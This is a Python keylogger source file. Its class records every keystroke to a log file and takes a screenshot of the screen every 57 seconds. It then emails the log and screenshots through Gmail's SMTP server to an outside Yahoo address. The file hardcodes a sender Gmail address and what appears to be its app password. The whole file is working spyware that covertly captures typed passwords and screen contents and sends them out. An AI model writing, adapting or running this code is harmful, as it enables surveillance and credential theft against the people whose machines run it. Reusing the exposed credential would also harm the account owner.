from pynput import keyboard
import logging
import psutil
import datetime
import sys
import time
from PIL import ImageGrab
from email.message import EmailMessage
import ssl
import smtplib
import os

class KeyLogger():
    def __init__(self):
        self.count = 0
        self.stopLogging = False
        self.log_directory = "../captures/"
        self.log_file_path = "../LoggedFile.txt"
        self.screenshot_path = ""

        logging.basicConfig(filename=self.log_file_path, level=logging.DEBUG, format="%(message)s")

    def clearLogFile(self):
        with open(self.log_file_path, "w") as log_file:
            log_file.truncate(0)  # Clear the file

    def onPress(self, key):
        try:
            logging.info(f'Key pressed: {key.char}')
        except AttributeError:
            logging.info(f'Special key pressed: {key}')

    def beginLog(self):
        with keyboard.Listener(on_press=self.onPress) as silent:
            silent.join()

    def spy(self):
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)

        self.screenshot_path = os.path.join(self.log_directory, f"screenshot{self.count}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(self.screenshot_path)

    def sendEmail(self):
        sender = "amine.benhammeda@gmail.com"
        secret = "wjas kdtd onas tmsr"
        receiver = "hamada_amine@yahoo.com"
        subject = "Your log file and screenshot"
        body = "Log file and screenshot attached."

        em = EmailMessage()
        em['From'] = sender
        em['To'] = receiver
        em['Subject'] = subject
        em.set_content(body)

        # Attach the log file
        with open(self.log_file_path, 'rb') as log_file:
            em.add_attachment(log_file.read(), filename=os.path.basename(self.log_file_path), maintype='text', subtype='plain')

        # Attach the screenshot
        with open(self.screenshot_path, 'rb') as screenshot_file:
            em.add_attachment(screenshot_file.read(), filename=os.path.basename(self.screenshot_path), maintype='image', subtype='png')

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(sender, secret)
            smtp.sendmail(sender, receiver, em.as_string())

    def run(self):
        try:
            while True:
                self.spy()
                time.sleep(57)  # Take screenshot every 57 seconds
                if self.count % 2 == 0:
                    self.sendEmail()  # Send email every 2 minutes (10 screenshots)
                self.clearLogFile()
                self.count += 1  # Increment count after taking a screenshot
        except KeyboardInterrupt:
            print("\nLogging interrupted. Sending email and quitting.")
            self.sendEmail()